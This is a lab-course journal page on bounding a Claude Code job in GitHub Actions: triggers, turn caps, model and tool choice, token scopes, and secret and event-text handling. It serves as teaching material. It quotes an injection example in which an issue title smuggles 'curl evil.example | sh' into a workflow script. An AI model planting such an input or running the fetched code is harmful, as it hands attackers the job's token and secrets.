@@ -1,0 +1,465 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>A CI agent costs what its trigger, turn cap, model and tools allow</title>
+<style>/* Journals, on paper.
+ *
+ * The site is dark because a terminal is dark. Paper is not: printing the site's palette wastes
+ * ink and reads worse, so a journal inverts to a light ground and keeps only the green as an
+ * accent — headings, rules and the answers in the review section.
+ *
+ * Used by the TUI's journal PDF export (WeasyPrint) and by the site's print views of a journal and
+ * its cheat sheet (journals/<id>/print.html, cheat-sheet.html), which the browser prints.
+ */
+
+@page {
+    size: A4;
+    margin: 20mm 18mm 18mm;
+    @bottom-center {
+        content: counter(page) " / " counter(pages);
+        font-family: "IBM Plex Sans", -apple-system, sans-serif;
+        font-size: 8pt;
+        color: #6b7671;
+    }
+    @top-right {
+        content: string(journal-title);
+        font-family: "IBM Plex Sans", -apple-system, sans-serif;
+        font-size: 8pt;
+        color: #6b7671;
+    }
+}
+
+:root {
+    --ink: #14181a;
+    --soft: #4a545a;
+    --rule: #d8ded9;
+    --green: #1f7a45;      /* darker than the screen green: #4ade80 on paper is unreadable */
+    --code-bg: #f4f6f4;
+}
+
+html {
+    font-family: "IBM Plex Sans", -apple-system, "Helvetica Neue", sans-serif;
+    font-size: 10.5pt;
+    line-height: 1.55;
+    color: var(--ink);
+    background: #fff;
+}
+
+body { margin: 0; }
+
+/* The site's print views are also read on screen before anyone prints them: give them a column. */
+@media screen {
+    body { max-width: 48rem; margin: 2rem auto; padding: 0 1rem; }
+}
+
+/* -- the cover line ------------------------------------------------------- */
+
+header.journal {
+    border-bottom: 2px solid var(--green);
+    padding-bottom: 6mm;
+    margin-bottom: 8mm;
+}
+header.journal .brand {
+    font-family: "JetBrains Mono", ui-monospace, monospace;
+    font-size: 9pt;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: var(--green);
+}
+header.journal h1 {
+    string-set: journal-title content();
+    font-size: 22pt;
+    line-height: 1.15;
+    margin: 2mm 0 3mm;
+    font-weight: 600;
+}
+header.journal .meta { color: var(--soft); font-size: 9pt; }
+
+/* -- flow ----------------------------------------------------------------- */
+
+h2 {
+    font-size: 14pt;
+    margin: 9mm 0 3mm;
+    padding-bottom: 1.5mm;
+    border-bottom: 1px solid var(--rule);
+    break-after: avoid;
+    break-inside: avoid;
+}
+h3 {
+    font-size: 11.5pt;
+    margin: 6mm 0 2mm;
+    color: var(--green);
+    break-after: avoid;
+}
+p { margin: 0 0 3mm; orphans: 2; widows: 2; }
+ul, ol { margin: 0 0 3mm; padding-left: 6mm; }
+li { margin-bottom: 1.5mm; }
+strong { font-weight: 600; }
+a { color: var(--green); text-decoration: none; }
+
+/* -- code ----------------------------------------------------------------- */
+
+pre, code, kbd {
+    font-family: "JetBrains Mono", ui-monospace, "SF Mono", monospace;
+}
+code {
+    font-size: 0.88em;
+    background: var(--code-bg);
+    padding: 0.5mm 1mm;
+    border-radius: 1mm;
+}
+pre {
+    background: var(--code-bg);
+    border-left: 2px solid var(--green);
+    border-radius: 0 1mm 1mm 0;
+    padding: 3mm 4mm;
+    margin: 0 0 4mm;
+    font-size: 8.6pt;
+    line-height: 1.45;
+    white-space: pre-wrap;     /* a long command wraps rather than falling off the page */
+    break-inside: avoid;
+}
+pre code { background: none; padding: 0; font-size: inherit; }
+
+/* -- tables --------------------------------------------------------------- */
+
+table { border-collapse: collapse; width: 100%; margin: 0 0 4mm; font-size: 9.5pt; }
+th, td { text-align: left; padding: 1.5mm 2mm; border-bottom: 1px solid var(--rule); }
+th { color: var(--green); font-weight: 600; }
+
+/* -- review answers ------------------------------------------------------- */
+
+blockquote {
+    margin: 2mm 0 4mm;
+    padding: 2mm 0 2mm 4mm;
+    border-left: 2px solid var(--green);
+    color: var(--soft);
+    break-inside: avoid;
+}
+blockquote p { margin: 0; }
+
+/* -- the closing line ----------------------------------------------------- */
+
+footer.journal {
+    margin-top: 10mm;
+    padding-top: 4mm;
+    border-top: 1px solid var(--rule);
+    color: var(--soft);
+    font-size: 8.5pt;
+}
+</style><script>if (location.hash === "#print") addEventListener("load", function () { print(); });</script>
+</head><body>
+<header class="journal">
+  <div class="brand">norboten · journal</div>
+  <h1>A CI agent costs what its trigger, turn cap, model and tools allow</h1>
+  <div class="meta">claude-code, ai-agents · 40 minutes · 1866 words</div>
+</header>
+<p>A job that asks Claude Code to label an issue should cost a fraction of a cent and take seconds. The
+same job, written the way this lab’s was, can cost as much as the model is willing to think about:
+it starts on every issue edit and every comment, it runs on the largest model, it offers that model
+every tool and no reason to stop, and the workflow around it lets it run for six hours with a token
+that can rewrite the repository. Nothing is broken in the everyday sense. The workflow is simply
+unbounded in every direction a cost can grow.</p>
+<p>This lab bounds it in each of those directions, and graded separately, because each is a separate
+decision: <strong>how often it runs</strong> (the trigger), <strong>how long one run can go on</strong> (turns and a timeout),
+<strong>how much each turn costs</strong> (model, tools, output), and <strong>how much damage a run can do</strong>
+(permissions, secrets, and untrusted text in a shell).</p>
+<h2>What you should be able to do after this</h2>
+<ul>
+<li>Choose workflow triggers and activity types so a job runs once per event that matters.</li>
+<li>Cap a headless run with <code>--max-turns</code> (and know <code>--max-budget-usd</code>), and read how a capped run ends.</li>
+<li>Pick a model and a tool list for a classification job, and get its answer as structured output.</li>
+<li>Give a workflow’s <code>GITHUB_TOKEN</code> only the scopes it uses, and a job a timeout.</li>
+<li>Keep secrets and user-written text out of <code>run:</code> scripts.</li>
+<li>Estimate what a run cost from its JSON result, and say what that estimate is.</li>
+</ul>
+<h2>The mechanism</h2>
+<h3>How often: triggers and activity types</h3>
+<p>Every event a workflow lists is a run. Events that have activity types run for <strong>all</strong> of them unless
+<code>types</code> narrows it:</p>
+<table>
+<thead>
+<tr>
+<th>trigger</th>
+<th>runs when</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>issues</code></td>
+<td>an issue is opened, edited, deleted, transferred, pinned, closed, reopened, assigned, labeled, milestoned…</td>
+</tr>
+<tr>
+<td><code>issues: types: [opened]</code></td>
+<td>an issue is opened</td>
+</tr>
+<tr>
+<td><code>issue_comment</code></td>
+<td>any comment on any issue or pull request is created, edited or deleted</td>
+</tr>
+<tr>
+<td><code>pull_request_target</code></td>
+<td>pull request activity, in the base repository’s context, <strong>with its secrets</strong></td>
+</tr>
+</tbody>
+</table>
+<p>A labelling job needs <code>opened</code>. Events caused by the workflow’s own <code>GITHUB_TOKEN</code> do not start new
+runs, which stops the simplest loops, but a person editing a typo in an issue is a paid run under
+<code>types: [opened, edited]</code>. <code>pull_request_target</code> deserves separate caution: it exists to give workflows
+for pull requests from forks access to secrets, which is exactly why it must never run code or prompts
+from the pull request.</p>
+<h3>How long: turns, budget and timeout</h3>
+<p>A <code>claude -p</code> run is a loop: the model answers, and if the answer calls a tool, Claude Code runs it
+and asks again. By default there is <strong>no limit</strong> on that loop. In the lab image, the scripted model
+that always asks to read one more file drove 1,186 turns in 25 seconds before the test killed it —
+an instant fake model; a real one takes seconds per turn and bills every one.</p>
+<ul>
+<li><code>--max-turns N</code> ends the run after N turns with <code>&quot;subtype&quot;: &quot;error_max_turns&quot;</code>, <code>is_error: true</code>
+and exit status 1.</li>
+<li><code>--max-budget-usd X</code> ends it when Claude Code’s cost estimate passes X (subagents included).</li>
+<li><code>timeout-minutes</code> on the job is the workflow’s backstop; its default is 360.</li>
+</ul>
+<p>A triage answer is one turn. With structured output (below) it takes two — the tool call and the
+end of the turn — so a cap of 3 leaves room without leaving a loop.</p>
+<h3>How much per turn: model, tools and output</h3>
+<p>The model is the largest single factor in price. Classification, labelling and short summaries are
+Haiku work; this job named <code>--model opus</code>, and a job that names no model runs on the account’s
+default. Tools cost twice: their definitions are sent on every request, and each call is another
+turn. <code>--dangerously-skip-permissions</code> offers the model every tool it has — here 21 of them, <code>Bash</code>,
+<code>Write</code> and <code>WebFetch</code> included — and invites it to explore. <code>--tools &quot;&quot;</code> offers none.</p>
+<p>Structured output makes the answer machine-readable and removes a turn of prose:</p>
+<pre><code class="language-sh">schema='{&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:{&quot;label&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;enum&quot;:[&quot;bug&quot;,&quot;question&quot;,&quot;lab-request&quot;]}},&quot;required&quot;:[&quot;label&quot;],&quot;additionalProperties&quot;:false}'
+claude -p &quot;Label the GitHub issue on stdin …&quot; --model haiku --tools &quot;&quot; --max-turns 3 \
+    --json-schema &quot;$schema&quot; --output-format json &gt; out.json
+jq -r '.structured_output.label' out.json
+</code></pre>
+<p>With <code>--json-schema</code> the model is offered exactly one tool, <code>StructuredOutput</code>, whose input is
+validated against the schema, and the validated object lands in <code>structured_output</code>. The <code>result</code>
+field then holds the same object as a JSON <strong>string</strong> — a script reading <code>.result</code> prints
+<code>{&quot;label&quot;:&quot;bug&quot;}</code>.</p>
+<p>For Norboten’s own triage job, measured on a real subscription run (docs/claude-code-in-norboten.md),
+this shape costs $0.0028–0.0038 a run with thinking turned off.</p>
+<h3>What the estimate is</h3>
+<p><code>total_cost_usd</code> and <code>modelUsage</code> in the result are Claude Code’s client-side estimate at list prices.
+On a subscription token they are not a bill — usage counts against the plan — but they are the right
+number to compare shapes of the same job, and <code>--max-budget-usd</code> uses the same estimate.</p>
+<h3>How much damage: the workflow</h3>
+<ul>
+<li><strong><code>permissions</code>.</strong> <code>write-all</code> gives the token every scope: contents, workflows, packages, releases.
+A labelling job needs <code>issues: write</code>, and <code>contents: read</code> for the checkout. A workflow without a
+<code>permissions</code> block gets the repository’s default, which on many repositories is still write.</li>
+<li><strong>Secrets in <code>run:</code>.</strong> <code>${{ secrets.X }}</code> inside a script puts the value into the script’s text.
+GitHub masks exact matches in logs, but not a substring cut with <code>cut -c1-24</code>, a base64 of it, or a
+line split across outputs. Pass secrets through <code>env:</code> and never print them.</li>
+<li><strong>Event text in <code>run:</code>.</strong> <code>${{ github.event.issue.title }}</code> is substituted before the shell starts,
+so a title of <code>x&quot;; curl evil.example | sh; echo &quot;</code> becomes code running with the job’s token and
+secrets. Pass it through <code>env:</code> and use <code>&quot;$TITLE&quot;</code>, where it is data. For the model the same text is
+also untrusted: tell it so, and give it nothing it can act with.</li>
+</ul>
+<h2>A failure, walked through</h2>
+<p>Replayed in the lab container (Claude Code 2.1.270, scripted models). First, how far the unbounded
+script goes when the model asks forty times for “one more look” before answering:</p>
+<pre><code class="language-console">$ time (GITHUB_EVENT_PATH=ci/sample-event.json sh ci/triage.sh)
+question
+real	0m0.660s
+$ jq -c '{num_turns, total_cost_usd, modelUsage: (.modelUsage | keys)}' /tmp/triage.json
+{&quot;num_turns&quot;:41,&quot;total_cost_usd&quot;:0.041,&quot;modelUsage&quot;:[&quot;claude-opus-5&quot;]}
+</code></pre>
+<p>Forty-one turns on Opus, for one word. The scripted model reports a flat 100 input tokens per turn, so
+that $0.041 is far below what a real run would show: a real conversation resends its whole history on
+every turn. (Norboten’s real lab-author run took 15 turns and 163,802 input tokens.) With the lab’s
+own model, which never answers at all, the script does not end:</p>
+<pre><code class="language-console">$ time (GITHUB_EVENT_PATH=ci/sample-event.json timeout 10 sh ci/triage.sh; echo &quot;exit $?&quot;)
+exit 124
+real	0m10.004s
+</code></pre>
+<p>A turn cap alone ends the loop:</p>
+<pre><code class="language-console">$ sed -i 's/--dangerously-skip-permissions/--dangerously-skip-permissions --max-turns 3/' ci/triage.sh
+$ GITHUB_EVENT_PATH=ci/sample-event.json sh ci/triage.sh; echo &quot;exit $?&quot;
+exit 1
+$ jq -c '{subtype, num_turns, is_error}' /tmp/triage.json
+{&quot;subtype&quot;:&quot;error_max_turns&quot;,&quot;num_turns&quot;:4,&quot;is_error&quot;:true}
+</code></pre>
+<p>— but the run is still Opus with every tool, and the grader says so:</p>
+<pre><code>FAIL 03_haiku_with_no_tools: The run asks for claude-opus-5.
+</code></pre>
+<p>The script’s final form uses Haiku, no tools, a cap and a schema (above). Against a model that answers
+properly:</p>
+<pre><code class="language-console">$ GITHUB_EVENT_PATH=ci/sample-event.json sh ci/triage.sh
+bug
+$ jq -c '{subtype, num_turns, structured_output, result}' /tmp/triage.json
+{&quot;subtype&quot;:&quot;success&quot;,&quot;num_turns&quot;:2,&quot;structured_output&quot;:{&quot;label&quot;:&quot;bug&quot;},&quot;result&quot;:&quot;{\&quot;label\&quot;:\&quot;bug\&quot;}&quot;}
+</code></pre>
+<p>The workflow keeps its shape and loses everything unbounded:</p>
+<pre><code class="language-yaml">on:
+  issues:
+    types: [opened]
+
+permissions:
+  issues: write
+  contents: read
+
+concurrency:
+  group: triage-${{ github.event.issue.number }}
+
+jobs:
+  triage:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - name: Install Claude Code
+        run: curl -fsSL https://claude.ai/install.sh | bash -s 2.1.270
+      - name: Triage
+        env:
+          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
+          GH_TOKEN: ${{ github.token }}
+          ISSUE: ${{ github.event.issue.number }}
+        run: |
+          label=$(sh ci/triage.sh)
+          gh issue edit &quot;$ISSUE&quot; --add-label &quot;$label&quot;
+</code></pre>
+<p>The “check the token is there” step is gone rather than fixed: there is no safe way to print part of a
+secret. The grader:</p>
+<pre><code>PASS 01_only_new_issues_start_the_job: Only a newly opened issue starts the job.
+PASS 02_a_looping_model_is_stopped: A model that kept asking for more was stopped after 3 request(s).
+PASS 03_haiku_with_no_tools: Haiku, no tools, and the label read from structured output.
+     tools offered: ['StructuredOutput']
+PASS 04_least_privilege_and_a_timeout: Issues write and contents read at most, and a timeout of 15 minutes or less.
+PASS 05_nothing_secret_or_untrusted_in_run_scripts: Secrets and event fields reach the scripts only through env.
+</code></pre>
+<h2>Common wrong turns</h2>
+<p><strong>Capping turns and stopping there.</strong> The loop ends; each of the three turns is still Opus with 21 tool
+definitions. Caps bound the worst case; model and tools set the normal case.</p>
+<p><strong>Relying on <code>timeout-minutes</code> as the cap.</strong> Ten minutes of turns is still hundreds of paid requests.
+The timeout is for a hung process, not for a model that keeps going.</p>
+<p><strong>Reading <code>.result</code> after adding <code>--json-schema</code>.</strong> It is the JSON as a string. Read
+<code>.structured_output.label</code>, and give it a default for a run that ended without one.</p>
+<p><strong>Quoting the expression: <code>echo &quot;${{ github.event.issue.title }}&quot;</code>.</strong> The quotes are part of the script
+text the expression is pasted into; a title containing <code>&quot;</code> closes them. Only <code>env:</code> makes it data.</p>
+<p><strong><code>permissions: read-all</code> plus a step that uses a personal access token for writing.</strong> The PAT is a
+longer-lived secret with more scope than the job’s own token. Grant <code>issues: write</code> to <code>GITHUB_TOKEN</code>.</p>
+<p><strong>Dropping <code>set -eu</code> so the capped run “does not fail”.</strong> A run that hit its cap produced no label;
+letting the script carry on labels issues with an empty string. Fail, or fall back to a label a person
+will look at.</p>
+<p><strong>Moving to <code>anthropics/claude-code-action</code> and assuming it is bounded.</strong> The action passes your
+<code>claude_args</code>; turn caps, model and tools are still yours to set.</p>
+<h2>Cheat sheet</h2>
+<pre><code class="language-bash"># one bounded classification
+claude -p &quot;…&quot; --model haiku --tools &quot;&quot; --max-turns 3 \
+  --json-schema '{&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:{&quot;label&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;enum&quot;:[&quot;bug&quot;,&quot;question&quot;]}},&quot;required&quot;:[&quot;label&quot;]}' \
+  --no-session-persistence --output-format json &gt; out.json
+jq -r '.structured_output.label // &quot;question&quot;' out.json
+jq -c '{subtype, num_turns, is_error, total_cost_usd, models: (.modelUsage|keys)}' out.json
+
+# other caps
+claude -p &quot;…&quot; --max-budget-usd 0.50          # estimate-based, subagents included
+MAX_THINKING_TOKENS=0 claude -p &quot;…&quot;          # no extended thinking for no-tool jobs
+
+# is a run still going? (a job step that never ends)
+timeout 300 sh ci/triage.sh; echo &quot;exit $?&quot;  # 124 = killed by timeout
+</code></pre>
+<pre><code class="language-yaml"># workflow shape
+on:
+  issues:
+    types: [opened]
+permissions:
+  issues: write
+  contents: read
+concurrency:
+  group: triage-${{ github.event.issue.number }}
+jobs:
+  triage:
+    timeout-minutes: 10
+    steps:
+      - env:
+          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
+          TITLE: ${{ github.event.issue.title }}     # data, not code
+        run: printf '%s\n' &quot;$TITLE&quot; | sh ci/triage.sh
+</code></pre>
+<pre><code class="language-bash"># audit a workflow for expressions pasted into shells
+grep -n 'run:' -A20 .github/workflows/*.yml | grep -E '\$\{\{ *(secrets|github\.event)\.'
+</code></pre>
+<h2>Going deeper</h2>
+<p>Where this lab’s hints send you for reading, beyond this journal. In the TUI, <code>h</code> shows a
+hint’s reading and <code>l</code> opens a journal section; the lab’s page on the site lists the same.</p>
+<ul>
+<li><em>Claude Code in a job</em> (topic journal <code>claude-code</code>) — What a run costs</li>
+</ul>
+<p>Documentation:</p>
+<ul>
+<li>https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows</li>
+<li>https://code.claude.com/docs/en/cli-reference</li>
+<li>https://code.claude.com/docs/en/headless</li>
+<li>https://docs.github.com/en/actions/reference/security/secure-use</li>
+</ul>
+<p>The whole subject, end to end: the topic journal <em>Claude Code in a job</em> (<code>claude-code</code>) —
+the mechanism, the symptoms and their causes, exercises, and sources.</p>
+<h2>Review</h2>
+<ol>
+<li>
+<p>A workflow has <code>on: issues</code> with no types. Name three activities that start it besides opening an
+issue.</p>
+<blockquote>
+<p>Any of: edited, deleted, closed, reopened, assigned, unassigned, labeled, unlabeled, pinned,
+transferred, milestoned. Each is a run; <code>types: [opened]</code> limits it to new issues.</p>
+</blockquote>
+</li>
+<li>
+<p>What stops a <code>claude -p</code> run whose model keeps calling tools, if the command has no caps?</p>
+<blockquote>
+<p>Nothing in Claude Code: <code>-p</code> has no default turn or budget limit. Only an outside limit — the job’s
+<code>timeout-minutes</code> (360 by default) or a <code>timeout</code> command — ends it.</p>
+</blockquote>
+</li>
+<li>
+<p>How does a run end when it reaches <code>--max-turns</code>, and why should the script notice?</p>
+<blockquote>
+<p>With <code>subtype: error_max_turns</code>, <code>is_error: true</code> and exit status 1, and without an answer. A
+script that ignores it would act on an empty label.</p>
+</blockquote>
+</li>
+<li>
+<p>With <code>--tools &quot;&quot;</code> and <code>--json-schema</code>, which tools does the model see, and where is the answer?</p>
+<blockquote>
+<p>Only <code>StructuredOutput</code>. The validated object is in <code>structured_output</code>; <code>result</code> holds it as a JSON
+string.</p>
+</blockquote>
+</li>
+<li>
+<p>Why is <code>--dangerously-skip-permissions</code> a cost problem as well as a safety problem in a labelling
+job?</p>
+<blockquote>
+<p>It offers the model every tool (21 here), whose definitions are sent on every request and which
+invite extra turns of exploration — each one billed — besides letting it act without checks.</p>
+</blockquote>
+</li>
+<li>
+<p>What is wrong with <code>run: echo &quot;token starts ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}&quot; | cut -c1-24</code>?</p>
+<blockquote>
+<p>The secret is pasted into the script and its first characters are printed. Log masking hides exact
+matches, not a prefix produced by <code>cut</code>. There is no safe way to print part of a secret.</p>
+</blockquote>
+</li>
+<li>
+<p>Why is <code>${{ github.event.issue.title }}</code> inside <code>run:</code> dangerous even when quoted, and what is the
+fix?</p>
+<blockquote>
+<p>The expression is substituted into the script text before the shell parses it; a title containing
+a quote and <code>$(…)</code> becomes code. Put it in <code>env:</code> and use <code>&quot;$TITLE&quot;</code>.</p>
+</blockquote>
+</li>
+<li>
+<p>What does <code>total_cost_usd</code> in a run’s JSON result measure, on an API key and on a subscription token?</p>
+<blockquote>
+<p>Claude Code’s client-side estimate at list prices. On an API key it approximates the bill; on a
+subscription token usage counts against the plan instead, and the figure is for comparison only.</p>
+</blockquote>
+</li>
+</ol>
+
+<footer class="journal">
+  norboten.org · this journal accompanies the lab of the same name, where the machine is real and
+  the grading is done on its state.
+</footer>
+</body></html>
